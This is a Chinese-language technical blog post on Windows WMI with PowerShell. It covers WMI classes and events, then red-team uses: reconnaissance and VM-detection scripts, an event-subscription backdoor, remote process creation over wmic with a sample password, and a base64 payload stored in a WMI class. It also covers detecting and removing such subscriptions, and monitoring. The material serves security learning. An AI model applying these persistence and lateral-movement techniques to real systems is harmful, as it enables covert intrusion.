---
title: Powershell使用WMI
date: 2020-12-31 23:59:59 +0800
categories: [域安全, TA0002执行]
tags: [powershell, wmi, TA0002执行]     # TAG names should always be lowercase
typora-root-url: ..
---



# 一、WMI

- [WMI](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page)提供了一套通用的API使得常用脚本语言也能很方便地管理windows资源，比如powershell，VBScript等；通过它可以访问、配置、管理和监视所有的几乎所有的 Windows 资源

- WMI class是由不同的WMI Provider实现的，类别、目标相同的class会放在不同的namespace下。例如 Win32_Process和Win32_Service是由CIMWin32 Provider提供的，它们属于Root\CIMV2 命名空间，分别代表着windows 进程和服务。

- [WMI Explorer](https://powershell.org/2013/03/wmi-explorer/)是一个powershell-based wmi查看工具。

  ![img](/assets/img/1963614-20200328142854185-1119856276.png)

## 1. [WMI Providers](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-providers)  

WMI class是由WMI Provider实现的，在类定义里可以看到其provider，不过使用WMI不太需要Provider的细节，大多数时候知道namespace和class就可以了。

最常用的是[Win32 Provider](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-provider)。

  ![img](/assets/img/1963614-20200326202437395-1661280294.png)





## **2. [WMI Classes](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-classes)**

**WMI有4类Class**

- **[WMI System Classes](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-system-classes)**

  WMI中预定义的系统类，这一类class都以__开头， 类似于SQL Server中的系统表，属于所有命名空间。

​       比较常用的是[__EventConsumer](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--eventconsumer)，[__EventFilter](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--eventfilter)，[__FilterToConsumerBinding](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--filtertoconsumerbinding)这个组合，用于WMI订阅；

​       还有[__InstanceCreationEvent](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--instancecreationevent)，[__InstanceDeletionEvent](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--instancedeletionevent)， [__InstanceModificationEvent](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--instancemodificationevent)，当命名空间中的实例发生变化，比如新创建一个进程，就会触发[__InstanceCreationEvent](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--instancecreationevent)这个内部事件，因此常用与WMI订阅中。

- **[MSFT Classes](https://docs.microsoft.com/en-us/windows/win32/wmisdk/msft-classes)**

　　还没用过，见官方介绍吧

- **[CIM Classes](https://docs.microsoft.com/en-us/windows/win32/wmisdk/cimclas)**

　　我把它理解为WMI的核心类、基类，当想自定义WMI Class时，就可以继承CIM Classes中的类，实现自定义的类功能。如上述Win32_Process类所示，[WMI Win32 Classes](https://docs.microsoft.com/windows/desktop/CIMWin32Prov/win32-provider)都继承于CIM Classes中对应的class。

- **[Standard Consumer Classes](https://docs.microsoft.com/en-us/windows/win32/wmisdk/standard-consumer-classes)**

　　WMI标准消费者类，比如当进程创建事件触发，使用LogFileEventConsumer类来记录日志。它们是__EventConsumer的子类，属于Root\subscription命名空间。

| Class                                                        | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| [ActiveScriptEventConsumer](https://docs.microsoft.com/en-us/windows/win32/wmisdk/activescripteventconsumer) | Executes a predefined script in an arbitrary scripting language when an event is delivered to it. Example: [Running a Script Based on an Event](https://docs.microsoft.com/en-us/windows/win32/wmisdk/running-a-script-based-on-an-event) |
| [CommandLineEventConsumer](https://docs.microsoft.com/en-us/windows/win32/wmisdk/commandlineeventconsumer) | Launches an arbitrary process in the local system context when an event is delivered to it. Example: [Running a Program from the Command Line Based on an Event](https://docs.microsoft.com/en-us/windows/win32/wmisdk/running-a-program-from-the-command-line-based-on-an-event) |
| [LogFileEventConsumer](https://docs.microsoft.com/en-us/windows/win32/wmisdk/logfileeventconsumer) | Writes customized strings to a text log file when events are delivered to it. Example: [Writing to a Log File Based on an Event](https://docs.microsoft.com/en-us/windows/win32/wmisdk/writing-to-a-log-file-based-on-an-event) |
| [NTEventLogEventConsumer](https://docs.microsoft.com/en-us/windows/win32/wmisdk/nteventlogeventconsumer) | Logs a specific message to the Windows event log when an event is delivered to it. Example: [Logging to NT Event Log Based on an Event](https://docs.microsoft.com/en-us/windows/win32/wmisdk/logging-to-nt-event-log-based-on-an-event) |
| [ScriptingStandardConsumerSetting](https://docs.microsoft.com/en-us/windows/win32/wmisdk/scriptingstandardconsumersetting) | Provides registration data common to all instances of the [ActiveScriptEventConsumer](https://docs.microsoft.com/en-us/windows/win32/wmisdk/activescripteventconsumer) class. |
| [SMTPEventConsumer](https://docs.microsoft.com/en-us/windows/win32/wmisdk/smtpeventconsumer) | Sends an email message using SMTP each time an event is delivered to it. Example: [Sending Email Based on an Event](https://docs.microsoft.com/en-us/windows/win32/wmisdk/sending-e-mail-based-on-an-event) |

## 3. WMI Event

- **[Intrinsic Events](https://docs.microsoft.com/en-us/windows/win32/wmisdk/determining-the-type-of-event-to-receive#intrinsic-events)**

　　内部事件，指当WMI namespace，class，instance发生创建、修改、删除而产生的事件，比如新建一个Win32_Process实例就会产生[__InstanceCreationEvent](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--instancecreationevent)实例。内部事件需要使用WITHN轮询获取，内部事件列表如下：

| System class                                                 | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| [__ClassCreationEvent](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--classcreationevent) | Notifies a consumer when a class is created.                 |
| [__ClassDeletionEvent](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--classdeletionevent) | Notifies a consumer when a class is deleted.                 |
| [__ClassModificationEvent](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--classmodificationevent) | Notifies a consumer when a class is modified.                |
| [__InstanceCreationEvent](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--instancecreationevent) | Notifies a consumer when a class instance is created.        |
| [__InstanceOperationEvent](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--instanceoperationevent) | Notifies a consumer when any instance event occurs, such as creation, deletion, or modification of the instance. You can use this class in queries to get all types events associated with an instance. |
| [__InstanceDeletionEvent](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--instancedeletionevent) | Notifies a consumer when an instance is deleted.             |
| [__InstanceModificationEvent](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--instancemodificationevent) | Notifies a consumer when an instance is modified.            |
| [__NamespaceCreationEvent](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--namespacecreationevent) | Notifies a consumer when a namespace is created.             |
| [__NamespaceDeletionEvent](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--namespacedeletionevent) | Notifies a consumer when a namespace is deleted.             |
| [__NamespaceModificationEvent](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--namespacemodificationevent) | Notifies a consumer when a namespace is modified.            |
| [__ConsumerFailureEvent](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--consumerfailureevent) | Notifies a consumer when some other event is dropped due to a failure on the part of an event consumer. |
| [__EventDroppedEvent](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--eventdroppedevent) | Notifies a consumer when some other event is dropped instead of being delivered to the requesting event consumer. |
| [__EventQueueOverflowEvent](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--eventqueueoverflowevent) | Notifies a consumer when an event is dropped as a result of a delivery queue overflow. |
| [__MethodInvocationEvent](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--methodinvocationevent) | Notifies a consumer when a method call event occurs.         |

 

- **[Extrinsic Events](https://docs.microsoft.com/en-us/windows/win32/wmisdk/determining-the-type-of-event-to-receive#extrinsic-events)**

　　外部事件是受管系统中某些预定义条件的发生。外部事件的示例包括系统重新启动，注册表修改，严重错误和网络拥塞。与内部事件相比，外部事件发生时立刻被触发，不需要轮询。外部事件类均继承自__ExtrinsicEvent，MSDN给了使用Registry*Event的[例子](https://docs.microsoft.com/en-us/windows/win32/wmisdk/creating-a-proper-where-clause-for-the-registry-provider)，常用到的外部事件如下:

```
ROOT\CIMV2:Win32_ComputerShutdownEvent
ROOT\CIMV2:Win32_IP4RouteTableEvent
ROOT\CIMV2:Win32_ProcessStartTrace
ROOT\CIMV2:Win32_ModuleLoadTrace
ROOT\CIMV2:Win32_ThreadStartTrace
ROOT\CIMV2:Win32_VolumeChangeEvent
ROOT\CIMV2:Win32_PowerManagementEvent
ROOT\CIMV2: Msft_WmiProvider* 
ROOT\DEFAULT:RegistryKeyChangeEvent 
ROOT\DEFAULT:RegistryValueChangeEvent
```

## 4. [System.Management Namespace ](https://docs.microsoft.com/en-us/dotnet/api/system.management?view=netframework-4.8)

.Net中用System.Management namespace下的类与WMI交互，以下三个是出镜率比较高的class。

[ManagementClass](https://docs.microsoft.com/en-us/dotnet/api/system.management.managementclass?view=netframework-4.8)

[ManagementObject](https://docs.microsoft.com/en-us/dotnet/api/system.management.managementobject?view=netframework-4.8)

[ManagementObjectCollection](https://docs.microsoft.com/en-us/dotnet/api/system.management.managementobjectcollection?view=netframework-4.8)

ManagementObject对应一个WMI Class实例，ManagementClass是ManagementObject的管理类，通过ManagementClass.CreateInstance()能创建一个实例，ManagementClass.GetInstances()返回一个ManagementObjectCollection对象，即对应WMI Class所有实例。

```
$manage_class=([System.Management.ManagementClass]"\\.\root\cimv2:Win32_Process")
$manage_object=([System.Management.ManagementClass]"\\.\root\cimv2:Win32_Process").CreateInstance()
$manage_objects=([System.Management.ManagementClass]"\\.\root\cimv2:Win32_Process").GetInstances()
```





# 二、红队应用

整理、参考自：

http://drops.xmd5.com/static/drops/tips-8189.html

http://drops.xmd5.com/static/drops/tips-8260.html

[https://wooyun.js.org/drops/WMI%20Defense.html](https://wooyun.js.org/drops/WMI Defense.html)

https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/



## 1. 侦察

操作系统相关信息

```
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_OperatingSystem
wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_OperatingSystem GET /all /FORMAT:list
wmic os  GET /all /FORMAT:list

Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_ComputerSystem
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_BIOS
```

文件/目录列表

```
Get-WmiObject -Namespace ROOT\CIMV2 -Class CIM_DataFile
```

磁盘卷列表

```
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Volume
```

[注册表操作](https://docs.microsoft.com/zh-cn/windows/win32/wmisdk/wmi-tasks--registry?redirectedfrom=MSDN)

```
$HKEY_CURRENT_USER =&H80000001
$computer ='.'
$reg = [WMIClass]"ROOT\DEFAULT:StdRegProv"
$Key = "Console"
$Value = "HistoryBufferSize"
$results = $reg.GetDWORDValue($HKEY_CURRENT_USER, $Key, $value)
"Current History Buffer Size: {0}" -f $results.uValue
```

```
wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call GetDWORDValue ^&H80000001,"Console", "HistoryBufferSize"
```

当前进程

```
wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_Process GET Caption /FORMAT:list
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Process
```

列举服务

```
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Service
```

日志

```
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_NtLogEvent
```

登陆账户

```
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_LoggedOnUser
```

共享

```
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Share
```

补丁

```
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_QuickFixEngineering
```

杀毒软件

```
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
```

虚拟机检测

```
$VMwareDetected = $False
$VMAdapter = Get-WmiObject Win32_NetworkAdapter -Filter 'Manufacturer LIKE
"%VMware%" OR Name LIKE "%VMware%"'
$VMBios = Get-WmiObject Win32_BIOS -Filter 'SerialNumber LIKE "%VMware%"'
$VMToolsRunning = Get-WmiObject Win32_Process -Filter 'Name="vmtoolsd.exe"'
if ($VMAdapter -or $VMBios -or $VMToolsRunning) 
{ 
	$VMwareDetected = $True 
	"in vm"
} 
else
{
	"not in vm"
}
```

```
$VMDetected = $False
$Arguments = @{
 Class = 'Win32_ComputerSystem'
 Filter = 'NumberOfLogicalProcessors < 2 AND TotalPhysicalMemory < 2147483648'
}
if (Get-WmiObject @Arguments) { 
    $VMDetected = $True
    "In vm"
 } 
 else{
 	"Not in vm"
 }
```

```
wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_ComputerSystem GET NumberOfLogicalProcessors,TotalPhysicalMemory /FORMAT:list
```



## 2. 持久化

开机超过180s，每5s启动一次notepad.exe

```
//管理员权限
$wmiParams = @{
    Computername = $env:COMPUTERNAME
    ErrorAction = 'Stop'
    NameSpace = 'root\subscription'
}
$wmiParams.Class = '__EventFilter'
$wmiParams.Arguments = @{
    Name = 'evil'
    EventNamespace = 'root\CIMV2'
    QueryLanguage = 'WQL'
    Query = "select * from __InstanceModificationEvent within 5 where targetInstance isa 'Win32_PerfFormattedData_PerfOS_System' and targetInstance.SystemUpTime >= 180 "
}
$filterResult = Set-WmiInstance @wmiParams


$wmiParams.Class = 'CommandLineEventConsumer'
$wmiParams.Arguments = @{
    Name = 'evil'
    CommandLineTemplate = 'C:\Windows\System32\notepad.exe'
}
$consumerResult = Set-WmiInstance @wmiParams

$wmiParams.Class = '__FilterToConsumerBinding'
$wmiParams.Arguments = @{
    Filter = $filterResult
    Consumer = $consumerResult
}
$bindingResult = Set-WmiInstance @wmiParams
```

![image-20200903151901734](/assets/img/image-20200903151901734.png)

查看WMI后门

```
//管理员权限
#List Event Filters
Get-WMIObject -Namespace root\Subscription -Class __EventFilter

#List Event Consumers
Get-WMIObject -Namespace root\Subscription -Class __EventConsumer

#List Event Bindings
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
```

删除WMI后门

```
//管理员权限
#Filter
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='evil'" | Remove-WmiObject -Verbose

#Consumer
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='evil'" | Remove-WmiObject -Verbose

#Binding
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%evil%'" | Remove-WmiObject -Verbose
```



## 3. 横向移动 

```
wmic /node:192.168.240.144 /user:ring2\win10 /password:trend#1. process call create "notepad.exe"
wmic /node:192.168.240.144 /user:ring2\win10 /password:trend#1. process where name="notepad.exe" delete
```

![image-20200903142217578](/assets/img/image-20200903142217578.png)

如果出现RPC 服务器不可用”这个错误，可以确认下防火墙入站规则中是否开启了wmi

![img](/assets/img/1963614-20200315091802828-1562494016.png)





## 4. 存储payload

把payload 存储在类属性中，不会留下文件，实际位于硬盘上的一个复杂的数据库中(objects.data)

```
【管理员权限】

# 新建evil ManagementClass
$evilClass = New-Object System.Management.ManagementClass("root\cimv2", $null, $null) 
$evilClass.__CLASS = "evil"
$evilClass.Properties.Add("Code", [System.Management.CimType]::String, $false)
$command = "Start-Process notepad.exe"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
$evilClass.Properties["Code"].Value = $encodedCommand
$evilClass.Put() 

# 执行储存在evil class属性中的代码
$code = ([wmiclass]"\\.\root\cimv2:evil").Properties["Code"].value 
powershell.exe -enc $code

# 删除
$evilClass.delete()
```



# 更多

## 1. WMI订阅

以监控到notepad.exe启动后记录日志为例

powershell cmdlet Set-WmiInstance支持创建一个WMI Instance

```
#wmiParams字典用于Splatting, 指定3个参数 -Computername, -ErrorAction, -Namespace
$wmiParams = @{
    Computername = $env:COMPUTERNAME
    ErrorAction = 'Stop'
    NameSpace = 'root\subscription'
}

#新建Filter, $wmiParams.Arguments就是Set-WmiInstance命令里的-Arguments参数，其值是__EventFilter构造函数所需参数
$wmiParams.Class = '__EventFilter'
$wmiParams.Arguments = @{
    Name = 'ProcessFilter'
    EventNamespace = 'root\CIMV2'
    QueryLanguage = 'WQL'
    Query = "select * from __InstanceCreationEvent within 5 where targetInstance isa 'Win32_Process' and targetInstance.Name = 'Notepad.exe' "
}
$filterResult = Set-WmiInstance @wmiParams


#同理，新建Consumer
$wmiParams.Class = 'LogFileEventConsumer'
$wmiParams.Arguments = @{
    Name = 'ProcessConsumer'
    Text = 'A process has been created: %TargetInstance.Name%'
    FileName = $env:USERPROFILE + "\Desktop\log.log"
}
$consumerResult = Set-WmiInstance @wmiParams

#同理，新建Binding
$wmiParams.Class = '__FilterToConsumerBinding'
$wmiParams.Arguments = @{
    Filter = $filterResult
    Consumer = $consumerResult
}
$bindingResult = Set-WmiInstance @wmiParams

##移除WMI订阅事件
#Filter
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='ProcessFilter'" | Remove-WmiObject -Verbose
#Consumer
Get-WMIObject -Namespace root\Subscription -Class LogFileEventConsumer -Filter "Name='ProcessConsumer'" | Remove-WmiObject -Verbose
#Binding
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%ProcessFilter%'"  | Remove-WmiObject -Verbose
```

也可以用原生.Net类ManagementClass创建WMI Instance。

```
#Creating a new event filter
$instanceFilter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$instanceFilter.QueryLanguage = "WQL"
$instanceFilter.Query = "select * from __InstanceCreationEvent within 5 where targetInstance isa 'Win32_Process' and targetInstance.Name = 'Notepad.exe'"
$instanceFilter.Name = "ProcessFilter"
$instanceFilter.EventNamespace = 'root\cimv2'
$result = $instanceFilter.Put()
$newFilter = $result.Path

#Creating a new event consumer
$instanceConsumer = ([wmiclass]"\\.\root\subscription:LogFileEventConsumer").CreateInstance()
$instanceConsumer.Name = 'LogFileEventConsumer'
$instanceConsumer.Filename = $env:USERPROFILE + "\Desktop\log2.log"
$instanceConsumer.Text = 'A process has been created: %TargetInstance.Name%'
$result = $instanceConsumer.Put()
$newConsumer = $result.Path

#Bind filter and consumer
$instanceBinding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$instanceBinding.Filter = $newFilter
$instanceBinding.Consumer = $newConsumer
$result = $instanceBinding.Put()
$newBinding = $result.Path

##Removing WMI Subscriptions using Remove-WMIObject
([wmi]$newFilter).Delete()
([wmi]$newConsumer).Delete()
([wmi]$newBinding).Delete()
```

*%SystemRoot%\System32\wbem\Repository\OBJECTS.DATA* 下会记录WMI订阅的信息，如果怀疑感染后被设置WMI订阅驻留，除了powershell命令，也可以看看这个文件有没有特别的WMI 订阅。

![img](/assets/img/1963614-20200327221519531-627324002.png)

 

除了LogFileEventConsumer，CommandLineEventConsumer，还可以使用ActiveScriptEventConsumer 执行脚本

（1）直接执行现有脚本

```
instance of ActiveScriptEventConsumer as $Cons
{
    Name = "ASEC";
    ScriptingEngine = "VBScript";
    ScriptFileName = "c:\\asec2.vbs";
};
```

（2）内嵌脚本，不会留下痕迹

```
instance of ActiveScriptEventConsumer as $Cons
{
    Name = "ASEC";
    ScriptingEngine = "VBScript";

    ScriptText =
        "Dim objFS, objFile\n"
        "Set objFS = CreateObject(\"Scripting.FileSystemObject\")\n"
        "Set objFile = objFS.OpenTextFile(\"C:\\ASEC.log\","
        " 8, true)\nobjFile.WriteLine \"Time: \" & Now & \";"
        " Entry made by: ASEC\"\nobjFile.WriteLine"
        " \"Application closed. UserModeTime:  \" & "
        "TargetEvent.TargetInstance.UserModeTime &_\n"
        "\"; KernelModeTime: \" & "
        "TargetEvent.TargetInstance.KernelModeTime "
        "& \" [hundreds of nanoseconds]\"\n"
        "objFile.Close\n";
};
```



## 2. 系统监控

### **监视进程创建**

```
 $filterName = 'BotFilter48'
    $consumerName = 'BotConsumer48'

    #查询进程创建事件

    $Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'"

    $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop

    #写入日志文件

    $Arg =@{
                Name=$consumerName
                    Filename = 'C:\test\log.log'
                    Text = 'New Process Created with name %TargetInstance.Name%'
                }

    $WMIEventConsumer = Set-WmiInstance -Class LogFileEventConsumer -Namespace "root\subscription" -Arguments $Arg

    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
```



### 监视进程结束

```
$filterName = 'BotFilter49'
$consumerName = 'BotConsumer49'


# 查询进程结束事件

$Query = "SELECT * FROM __InstanceDeletionEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'"
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop

$Arg =@{
                Name=$consumerName
                Filename = 'C:\test\log.log'
                Text = 'Task kill with name %TargetInstance.Name%'
    }
$WMIEventConsumer = Set-WmiInstance -Class LogFileEventConsumer -Namespace "root\subscription" -Arguments $Arg

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
```



### 监视注册表

（1）监视单一键值

```
$filterName = 'BotFilter51'
$consumerName = 'BotConsumer51'

$Query ="SELECT * FROM RegistryKeyChangeEvent WHERE Hive='HKEY_LOCAL_MACHINE' AND KeyPath='SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'" 

$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\default";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop

$Arg =@{
                Name=$consumerName
                Filename = 'C:\test\log.log'
                Text ='The change is HKEY_LOCAL_MACHINE\\%KeyPath%'
    }


$WMIEventConsumer = Set-WmiInstance -Class LogFileEventConsumer -Namespace "root\subscription" -Arguments $Arg

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
```

(2)监视某一键值及其子键

监视 “`HKEY_LOCAL_MACHINE\\SOFTWARE\Microsoft`” 键值及其子键的任何改动

```
$filterName = 'BotFilter52'
$consumerName = 'BotConsumer52'

$Query ="SELECT * FROM RegistryTreeChangeEvent WHERE Hive='HKEY_LOCAL_MACHINE' AND RootPath='SOFTWARE\\Microsoft\\'" 

$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=
$filterName;EventNameSpace="root\default";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop

$Arg =@{
                Name=$consumerName
                Filename = 'C:\test\logtree.log'
                Text ='The change is HKEY_LOCAL_MACHINE\\%RootPath%'
    }

$WMIEventConsumer = Set-WmiInstance -Class LogFileEventConsumer -Namespace "root\subscription" -Arguments $Arg
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=

$WMIEventFilter;Consumer=$WMIEventConsumer}
```